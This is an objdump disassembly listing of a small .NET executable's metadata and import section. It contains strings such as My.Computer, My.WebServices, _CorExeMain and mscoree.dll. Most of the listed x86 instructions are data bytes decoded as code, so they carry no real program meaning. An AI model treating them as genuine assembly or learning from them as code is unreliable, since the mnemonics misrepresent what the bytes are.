  40a6e6:	12 28                	adc    (%eax),%ch
  40a6e8:	06                   	push   %es
  40a6e9:	00 02                	add    %al,(%edx)
  40a6eb:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40a6ee:	7d 06                	jge    0x40a6f6
  40a6f0:	00 01                	add    %al,(%ecx)
  40a6f2:	0e                   	push   %cs
  40a6f3:	10 1d 05 03 00 00    	adc    %bl,0x305
  40a6f9:	02 03                	add    (%ebx),%al
  40a6fb:	00 00                	add    %al,(%eax)
  40a6fd:	18 11                	sbb    %dl,(%ecx)
  40a6ff:	00 08                	add    %cl,(%eax)
  40a701:	08 10                	or     %dl,(%eax)
  40a703:	0e                   	push   %cs
  40a704:	10 0e                	adc    %cl,(%esi)
  40a706:	08 10                	or     %dl,(%eax)
  40a708:	08 10                	or     %dl,(%eax)
  40a70a:	08 10                	or     %dl,(%eax)
  40a70c:	08 10                	or     %dl,(%eax)
  40a70e:	0e                   	push   %cs
  40a70f:	08 01                	or     %al,(%ecx)
  40a711:	22 07                	and    (%edi),%al
  40a713:	00 03                	add    %al,(%ebx)
  40a715:	08 18                	or     %bl,(%eax)
  40a717:	10 0e                	adc    %cl,(%esi)
  40a719:	08 04 00             	or     %al,(%eax,%eax,1)
  40a71c:	01 08                	add    %ecx,(%eax)
  40a71e:	0a 0a                	or     (%edx),%cl
  40a720:	00 05 02 06 10 0e    	add    %al,0xe100602
  40a726:	08 10                	or     %dl,(%eax)
  40a728:	0e                   	push   %cs
  40a729:	08 07                	or     %al,(%edi)
  40a72b:	00 02                	add    %al,(%edx)
  40a72d:	02 12                	add    (%edx),%dl
  40a72f:	69 12 69 05 00 01    	imul   $0x1000569,(%edx),%edx
  40a735:	0e                   	push   %cs
  40a736:	10 0e                	adc    %cl,(%esi)
  40a738:	05 00 02 1c 0e       	add    $0xe1c0200,%eax
  40a73d:	1c 04                	sbb    $0x4,%al
  40a73f:	00 01                	add    %al,(%ecx)
  40a741:	1c 0e                	sbb    $0xe,%al
  40a743:	04 00                	add    $0x0,%al
  40a745:	01 08                	add    %ecx,(%eax)
  40a747:	08 04 00             	or     %al,(%eax,%eax,1)
  40a74a:	01 0a                	add    %ecx,(%edx)
  40a74c:	0a 07                	or     (%edi),%al
  40a74e:	00 04 01             	add    %al,(%ecx,%eax,1)
  40a751:	08 09                	or     %cl,(%ecx)
  40a753:	09 08                	or     %ecx,(%eax)
  40a755:	0a 00                	or     (%eax),%al
  40a757:	07                   	pop    %es
  40a758:	08 08                	or     %cl,(%eax)
  40a75a:	08 08                	or     %cl,(%eax)
  40a75c:	08 08                	or     %cl,(%eax)
  40a75e:	08 08                	or     %cl,(%eax)
  40a760:	09 00                	or     %eax,(%eax)
  40a762:	04 0a                	add    $0xa,%al
  40a764:	10 0e                	adc    %cl,(%esi)
  40a766:	10 0e                	adc    %cl,(%esi)
  40a768:	0a 0a                	or     (%edx),%cl
  40a76a:	05 00 02 01 08       	add    $0x8010200,%eax
  40a76f:	08 05 00 01 01 1d    	or     %al,0x1d010100
  40a775:	05 08 00 04 08       	add    $0x8040008,%eax
  40a77a:	18 08                	sbb    %cl,(%eax)
  40a77c:	10 08                	adc    %cl,(%eax)
  40a77e:	08 06                	or     %al,(%esi)
  40a780:	00 02                	add    %al,(%edx)
  40a782:	1c 1d                	sbb    $0x1d,%al
  40a784:	05 0e 06 00 01       	add    $0x100060e,%eax
  40a789:	1d 05 10 0e 05       	sbb    $0x50e1005,%eax
  40a78e:	00 01                	add    %al,(%ecx)
  40a790:	02 1d 05 08 00 03    	add    0x3000805,%bl
  40a796:	02 0e                	add    (%esi),%cl
  40a798:	1c 11                	sbb    $0x11,%al
  40a79a:	81 11 06 00 01 1d    	adcl   $0x1d010006,(%ecx)
  40a7a0:	05 1d 05 04 06       	add    $0x604051d,%eax
  40a7a5:	11 81 d1 06 20 01    	adc    %eax,0x12006d1(%ecx)
  40a7ab:	0e                   	push   %cs
  40a7ac:	11 81 d1 04 00 01    	adc    %eax,0x10004d1(%ecx)
  40a7b2:	06                   	push   %es
  40a7b3:	08 06                	or     %al,(%esi)
  40a7b5:	00 02                	add    %al,(%edx)
  40a7b7:	08 18                	or     %bl,(%eax)
  40a7b9:	10 08                	adc    %cl,(%eax)
  40a7bb:	05 00 02 09 09       	add    $0x9090200,%eax
  40a7c0:	09 0d 00 07 08 09    	or     %ecx,0x9080700
  40a7c6:	09 1d 05 12 81 e1    	or     %ebx,0xe1811205
  40a7cc:	08 09                	or     %cl,(%ecx)
  40a7ce:	18 01                	sbb    %al,(%ecx)
  40a7d0:	15 04 00 01 0e       	adc    $0xe010004,%eax
  40a7d5:	09 07                	or     %eax,(%edi)
  40a7d7:	06                   	push   %es
  40a7d8:	15 12 81 f1 01       	adc    $0x1f18112,%eax
  40a7dd:	18 05 00 02 02 18    	sbb    %al,0x18020200
  40a7e3:	02 07                	add    (%edi),%al
  40a7e5:	00 03                	add    %al,(%ebx)
  40a7e7:	08 08                	or     %cl,(%eax)
  40a7e9:	10 0e                	adc    %cl,(%esi)
  40a7eb:	08 08                	or     %cl,(%eax)
  40a7ed:	00 04 08             	add    %al,(%eax,%ecx,1)
  40a7f0:	08 08                	or     %cl,(%eax)
  40a7f2:	08 10                	or     %dl,(%eax)
  40a7f4:	0e                   	push   %cs
  40a7f5:	08 00                	or     %al,(%eax)
  40a7f7:	03 08                	add    (%eax),%ecx
  40a7f9:	08 12                	or     %dl,(%edx)
  40a7fb:	81 e1 08 08 00 03    	and    $0x3000808,%ecx
  40a801:	08 18                	or     %bl,(%eax)
  40a803:	12 2c 10             	adc    (%eax,%edx,1),%ch
  40a806:	18 05 20 02 02 08    	sbb    %al,0x8020220
  40a80c:	08 05 20 01 1d 18    	or     %al,0x181d0120
  40a812:	18 0b                	sbb    %cl,(%ebx)
  40a814:	20 04 12             	and    %al,(%edx,%edx,1)
  40a817:	81 e9 08 08 12 81    	sub    $0x81120808,%ecx
  40a81d:	ed                   	in     (%dx),%eax
  40a81e:	1c 06                	sbb    $0x6,%al
  40a820:	20 01                	and    %al,(%ecx)
  40a822:	02 12                	add    (%edx),%dl
  40a824:	81 e9 04 08 00 12    	sub    $0x12000804,%ecx
  40a82a:	0c 10                	or     $0x10,%al
  40a82c:	01 00                	add    %eax,(%eax)
  40a82e:	0b 4d 79             	or     0x79(%ebp),%ecx
  40a831:	2e 43                	cs inc %ebx
  40a833:	6f                   	outsl  %ds:(%esi),(%dx)
  40a834:	6d                   	insl   (%dx),%es:(%edi)
  40a835:	70 75                	jo     0x40a8ac
  40a837:	74 65                	je     0x40a89e
  40a839:	72 00                	jb     0x40a83b
  40a83b:	00 04 08             	add    %al,(%eax,%ecx,1)
  40a83e:	00 12                	add    %dl,(%edx)
  40a840:	08 13                	or     %dl,(%ebx)
  40a842:	01 00                	add    %eax,(%eax)
  40a844:	0e                   	push   %cs
  40a845:	4d                   	dec    %ebp
  40a846:	79 2e                	jns    0x40a876
  40a848:	41                   	inc    %ecx
  40a849:	70 70                	jo     0x40a8bb
  40a84b:	6c                   	insb   (%dx),%es:(%edi)
  40a84c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40a853:	00 00                	add    %al,(%eax)
  40a855:	04 08                	add    $0x8,%al
  40a857:	00 12                	add    %dl,(%edx)
  40a859:	55                   	push   %ebp
  40a85a:	0c 01                	or     $0x1,%al
  40a85c:	00 07                	add    %al,(%edi)
  40a85e:	4d                   	dec    %ebp
  40a85f:	79 2e                	jns    0x40a88f
  40a861:	55                   	push   %ebp
  40a862:	73 65                	jae    0x40a8c9
  40a864:	72 00                	jb     0x40a866
  40a866:	00 04 08             	add    %al,(%eax,%ecx,1)
  40a869:	00 12                	add    %dl,(%edx)
  40a86b:	14 13                	adc    $0x13,%al
  40a86d:	01 00                	add    %eax,(%eax)
  40a86f:	0e                   	push   %cs
  40a870:	4d                   	dec    %ebp
  40a871:	79 2e                	jns    0x40a8a1
  40a873:	57                   	push   %edi
  40a874:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40a878:	72 76                	jb     0x40a8f0
  40a87a:	69 63 65 73 00 00 04 	imul   $0x4000073,0x65(%ebx),%esp
  40a881:	28 00                	sub    %al,(%eax)
  40a883:	13 00                	adc    (%eax),%eax
  40a885:	08 01                	or     %al,(%ecx)
  40a887:	00 08                	add    %cl,(%eax)
  40a889:	00 00                	add    %al,(%eax)
  40a88b:	00 00                	add    %al,(%eax)
  40a88d:	00 1e                	add    %bl,(%esi)
  40a88f:	01 00                	add    %eax,(%eax)
  40a891:	01 00                	add    %eax,(%eax)
  40a893:	54                   	push   %esp
  40a894:	02 16                	add    (%esi),%dl
  40a896:	57                   	push   %edi
  40a897:	72 61                	jb     0x40a8fa
  40a899:	70 4e                	jo     0x40a8e9
  40a89b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a89c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a89d:	45                   	inc    %ebp
  40a89e:	78 63                	js     0x40a903
  40a8a0:	65 70 74             	gs jo  0x40a917
  40a8a3:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40a8aa:	77 73                	ja     0x40a91f
  40a8ac:	01 04 07             	add    %eax,(%edi,%eax,1)
  40a8af:	01 12                	add    %edx,(%edx)
  40a8b1:	0c 04                	or     $0x4,%al
  40a8b3:	07                   	pop    %es
  40a8b4:	01 12                	add    %edx,(%edx)
  40a8b6:	08 04 07             	or     %al,(%edi,%eax,1)
  40a8b9:	01 12                	add    %edx,(%edx)
  40a8bb:	55                   	push   %ebp
  40a8bc:	04 07                	add    $0x7,%al
  40a8be:	01 12                	add    %edx,(%edx)
  40a8c0:	14 03                	adc    $0x3,%al
  40a8c2:	07                   	pop    %es
  40a8c3:	01 02                	add    %eax,(%edx)
  40a8c5:	03 07                	add    (%edi),%eax
  40a8c7:	01 08                	add    %ecx,(%eax)
  40a8c9:	04 07                	add    $0x7,%al
  40a8cb:	01 12                	add    %edx,(%edx)
  40a8cd:	3d 03 07 01 0e       	cmp    $0xe010703,%eax
  40a8d2:	05 07 02 1e 00       	add    $0x1e0207,%eax
  40a8d7:	02 04 07             	add    (%edi,%eax,1),%al
  40a8da:	01 1e                	add    %ebx,(%esi)
  40a8dc:	00 05 07 02 13 00    	add    %al,0x130207
  40a8e2:	02 0a                	add    (%edx),%cl
  40a8e4:	07                   	pop    %es
  40a8e5:	06                   	push   %es
  40a8e6:	0e                   	push   %cs
  40a8e7:	0e                   	push   %cs
  40a8e8:	18 0e                	sbb    %cl,(%esi)
  40a8ea:	12 80 81 02 0a 07    	adc    0x70a0281(%eax),%al
  40a8f0:	06                   	push   %es
  40a8f1:	02 08                	add    (%eax),%cl
  40a8f3:	12 80 81 0e 0e 02    	adc    0x20e0e81(%eax),%al
  40a8f9:	0a 07                	or     (%edi),%al
  40a8fb:	04 02                	add    $0x2,%al
  40a8fd:	12 80 99 12 80 99    	adc    -0x667fed67(%eax),%al
  40a903:	02 1f                	add    (%edi),%bl
  40a905:	07                   	pop    %es
  40a906:	0e                   	push   %cs
  40a907:	02 12                	add    (%edx),%dl
  40a909:	69 12 80 81 12 80    	imul   $0x80128180,(%edx),%edx
  40a90f:	81 12 80 81 0e 12    	adcl   $0x120e8180,(%edx)
  40a915:	80 81 12 80 81 12 69 	addb   $0x69,0x12818012(%ecx)
  40a91c:	1d 1c 0e 1d 0e       	sbb    $0xe1d0e1c,%eax
  40a921:	1d 0e 02 05 07       	sbb    $0x705020e,%eax
  40a926:	02 0e                	add    (%esi),%cl
  40a928:	1d 05 05 07 01       	sbb    $0x1070505,%eax
  40a92d:	12 80 81 06 07 02    	adc    0x2070681(%eax),%al
  40a933:	1c 12                	sbb    $0x12,%al
  40a935:	80 81 0e 07 0a 0e 0e 	addb   $0xe,0xe0a070e(%ecx)
  40a93c:	08 08                	or     %cl,(%eax)
  40a93e:	08 08                	or     %cl,(%eax)
  40a940:	0e                   	push   %cs
  40a941:	0e                   	push   %cs
  40a942:	0e                   	push   %cs
  40a943:	12 80 81 06 07 03    	adc    0x3070681(%eax),%al
  40a949:	1c 1d                	sbb    $0x1d,%al
  40a94b:	0e                   	push   %cs
  40a94c:	02 05 07 01 12 80    	add    0x80120107,%al
  40a952:	c5 80 ac 07 51 1d    	lds    0x1d5107ac(%eax),%eax
  40a958:	0e                   	push   %cs
  40a959:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40a95e:	80 d9 12             	sbb    $0x12,%cl
  40a961:	80 d9 0e             	sbb    $0xe,%cl
  40a964:	0e                   	push   %cs
  40a965:	0e                   	push   %cs
  40a966:	11 80 dd 11 80 e1    	adc    %eax,-0x1e7fee23(%eax)
  40a96c:	1c 1d                	sbb    $0x1d,%al
  40a96e:	05 12 80 e5 12       	add    $0x12e58012,%eax
  40a973:	80 ad 12 80 81 12 80 	subb   $0x80,0x12818012(%ebp)
  40a97a:	81 0e 12 80 d9 12    	orl    $0x12d98012,(%esi)
  40a980:	80 81 12 80 81 0e 0e 	addb   $0xe,0xe818012(%ecx)
  40a987:	12 80 81 08 12 6d    	adc    0x6d120881(%eax),%al
  40a98d:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40a993:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40a999:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40a99f:	1d 05 1c 08 12       	sbb    $0x12081c05,%eax
  40a9a4:	6d                   	insl   (%dx),%es:(%edi)
  40a9a5:	1d 05 1c 08 12       	sbb    $0x12081c05,%eax
  40a9aa:	6d                   	insl   (%dx),%es:(%edi)
  40a9ab:	12 80 e9 11 80 ed    	adc    -0x127fee17(%eax),%al
  40a9b1:	11 80 f1 12 80 f5    	adc    %eax,-0xa7fed0f(%eax)
  40a9b7:	12 80 e9 0e 12 6d    	adc    0x6d120ee9(%eax),%al
  40a9bd:	12 6d 12             	adc    0x12(%ebp),%ch
  40a9c0:	80 81 08 12 6d 12 80 	addb   $0x80,0x126d1208(%ecx)
  40a9c7:	81 12 80 81 12 80    	adcl   $0x80128180,(%edx)
  40a9cd:	81 12 80 81 1d 1c    	adcl   $0x1c1d8180,(%edx)
  40a9d3:	1d 02 08 08 12       	sbb    $0x12080802,%eax
  40a9d8:	6d                   	insl   (%dx),%es:(%edi)
  40a9d9:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40a9df:	12 80 81 0e 0e 0e    	adc    0xe0e0e81(%eax),%al
  40a9e5:	1d 0e 08 1d 1c       	sbb    $0x1c1d080e,%eax
  40a9ea:	1d 1c 1d 02 0e       	sbb    $0xe021d1c,%eax
  40a9ef:	0e                   	push   %cs
  40a9f0:	0e                   	push   %cs
  40a9f1:	0e                   	push   %cs
  40a9f2:	11 80 f1 11 80 f1    	adc    %eax,-0xe7fee0f(%eax)
  40a9f8:	11 80 f1 11 80 f1    	adc    %eax,-0xe7fee0f(%eax)
  40a9fe:	0e                   	push   %cs
  40a9ff:	02 02                	add    (%edx),%al
  40aa01:	2e 07                	cs pop %es
  40aa03:	15 0e 0e 0e 12       	adc    $0x120e0e0e,%eax
  40aa08:	80 81 12 80 81 12 80 	addb   $0x80,0x12818012(%ecx)
  40aa0f:	81 12 80 81 12 80    	adcl   $0x80128180,(%edx)
  40aa15:	81 1d 0e 12 80 81 12 	sbbl   $0xe818012,0x8180120e
  40aa1c:	80 81 0e 
  40aa1f:	12 80 81 0e 0e 11    	adc    0x110e0e81(%eax),%al
  40aa25:	81 5d 11 81 5d 1d 0e 	sbbl   $0xe1d5d81,0x11(%ebp)
  40aa2c:	08 1d 0e 02 2b 07    	or     %bl,0x72b020e
  40aa32:	12 12                	adc    (%edx),%dl
  40aa34:	80 81 12 80 81 12 80 	addb   $0x80,0x12818012(%ecx)
  40aa3b:	81 12 80 81 12 80    	adcl   $0x80128180,(%edx)
  40aa41:	81 12 80 81 0e 1d    	adcl   $0x1d0e8180,(%edx)
  40aa47:	0e                   	push   %cs
  40aa48:	0e                   	push   %cs
  40aa49:	0e                   	push   %cs
  40aa4a:	11 81 75 12 80 81    	adc    %eax,-0x7e7fed8b(%ecx)
  40aa50:	12 81 79 12 80 81    	adc    -0x7e7fed87(%ecx),%al
  40aa56:	1d 0e 08 1d 0e       	sbb    $0xe1d080e,%eax
  40aa5b:	02 2b                	add    (%ebx),%ch
  40aa5d:	07                   	pop    %es
  40aa5e:	13 02                	adc    (%edx),%eax
  40aa60:	12 80 a1 08 0e 12    	adc    0x120e08a1(%eax),%al
  40aa66:	80 81 12 80 a1 12 80 	addb   $0x80,0x12a18012(%ecx)
  40aa6d:	81 12 80 a1 12 28    	adcl   $0x2812a180,(%edx)
  40aa73:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40aa79:	0e                   	push   %cs
  40aa7a:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40aa80:	12 80 81 12 28 18    	adc    0x18281281(%eax),%al
  40aa86:	02 02                	add    (%edx),%al
  40aa88:	09 07                	or     %eax,(%edi)
  40aa8a:	06                   	push   %es
  40aa8b:	1d 05 0e 08 0e       	sbb    $0xe080e05,%eax
  40aa90:	05 02 15 07 0b       	add    $0xb071502,%eax
  40aa95:	1d 12 81 ad 1c       	sbb    $0x1cad8112,%eax
  40aa9a:	08 12                	or     %dl,(%edx)
  40aa9c:	81 ad 1d 12 3d 08 12 	subl   $0x8083d12,0x83d121d(%ebp)
  40aaa3:	3d 08 08 
  40aaa6:	02 08                	add    (%eax),%cl
  40aaa8:	16                   	push   %ss
  40aaa9:	07                   	pop    %es
  40aaaa:	0e                   	push   %cs
  40aaab:	0a 08                	or     (%eax),%cl
  40aaad:	08 0a                	or     %cl,(%edx)
  40aaaf:	0e                   	push   %cs
  40aab0:	08 12                	or     %dl,(%edx)
  40aab2:	80 a1 12 80 81 12 80 	andb   $0x80,0x12818012(%ecx)
  40aab9:	81 08 03 02 02 08    	orl    $0x8020203,(%eax)
  40aabf:	04 07                	add    $0x7,%al
  40aac1:	01 1d 05 17 07 0b    	add    %ebx,0xb071705
  40aac7:	02 12                	add    (%edx),%dl
  40aac9:	69 1d 05 08 12 6d 12 	imul   $0x12818012,0x6d120805,%ebx
  40aad0:	80 81 12 
  40aad3:	80 81 12 80 81 12 69 	addb   $0x69,0x12818012(%ecx)
  40aada:	0e                   	push   %cs
  40aadb:	02 06                	add    (%esi),%al
  40aadd:	07                   	pop    %es
  40aade:	02 02                	add    (%edx),%al
  40aae0:	12 80 81 18 07 08    	adc    0x8071881(%eax),%al
  40aae6:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40aaec:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40aaf2:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40aaf8:	12 80 81 02 0e 07    	adc    0x70e0281(%eax),%al
  40aafe:	06                   	push   %es
  40aaff:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40ab04:	81 c5 12 6d 08 1d    	add    $0x1d086d12,%ebp
  40ab0a:	05 14 07 09 0e       	add    $0xe090714,%eax
  40ab0f:	18 08                	sbb    %cl,(%eax)
  40ab11:	12 80 f9 12 80 81    	adc    -0x7e7fed07(%eax),%al
  40ab17:	12 80 81 11 81 5d    	adc    0x5d811181(%eax),%al
  40ab1d:	1d 0e 02 11 07       	sbb    $0x711020e,%eax
  40ab22:	09 0e                	or     %ecx,(%esi)
  40ab24:	02 0e                	add    (%esi),%cl
  40ab26:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40ab2c:	11 81 d1 03 02 02    	adc    %eax,0x20203d1(%ecx)
  40ab32:	12 07                	adc    (%edi),%al
  40ab34:	09 0e                	or     %ecx,(%esi)
  40ab36:	09 1d 05 12 81 e1    	or     %ebx,0xe1811205
  40ab3c:	18 08                	sbb    %cl,(%eax)
  40ab3e:	12 80 81 12 80 81    	adc    -0x7e7fed7f(%eax),%al
  40ab44:	02 0d 07 07 08 08    	add    0x8080707,%cl
  40ab4a:	11 81 d1 0e 08 12    	adc    %eax,0x12080ed1(%ecx)
  40ab50:	80 81 02 1c 07 10 18 	addb   $0x18,0x10071c02(%ecx)
  40ab57:	08 12                	or     %dl,(%edx)
  40ab59:	80 f9 08             	cmp    $0x8,%cl
  40ab5c:	0e                   	push   %cs
  40ab5d:	08 12                	or     %dl,(%edx)
  40ab5f:	81 e1 15 12 81 f1    	and    $0xf1811215,%ecx
  40ab65:	01 18                	add    %ebx,(%eax)
  40ab67:	08 0e                	or     %cl,(%esi)
  40ab69:	08 18                	or     %bl,(%eax)
  40ab6b:	08 1d 18 0e 02 07    	or     %bl,0x7020e18
  40ab71:	07                   	pop    %es
  40ab72:	03 1d 18 12 28 18    	add    0x18281218,%ebx
  40ab78:	a0 ab 00 00 00       	mov    0xab,%al
  40ab7d:	00 00                	add    %al,(%eax)
  40ab7f:	00 00                	add    %al,(%eax)
  40ab81:	00 00                	add    %al,(%eax)
  40ab83:	00 be ab 00 00 00    	add    %bh,0xab(%esi)
  40ab89:	20 00                	and    %al,(%eax)
	...
  40ab9f:	00 b0 ab 00 00 00    	add    %dh,0xab(%eax)
	...
  40abb1:	00 5f 43             	add    %bl,0x43(%edi)
  40abb4:	6f                   	outsl  %ds:(%esi),(%dx)
  40abb5:	72 45                	jb     0x40abfc
  40abb7:	78 65                	js     0x40ac1e
  40abb9:	4d                   	dec    %ebp
  40abba:	61                   	popa
  40abbb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40abc2:	72 65                	jb     0x40ac29
  40abc4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40abc8:	6c                   	insb   (%dx),%es:(%edi)
  40abc9:	00 00                	add    %al,(%eax)
  40abcb:	00 00                	add    %al,(%eax)
  40abcd:	00 ff                	add    %bh,%bh
  40abcf:	25 00 20 40 00       	and    $0x402000,%eax
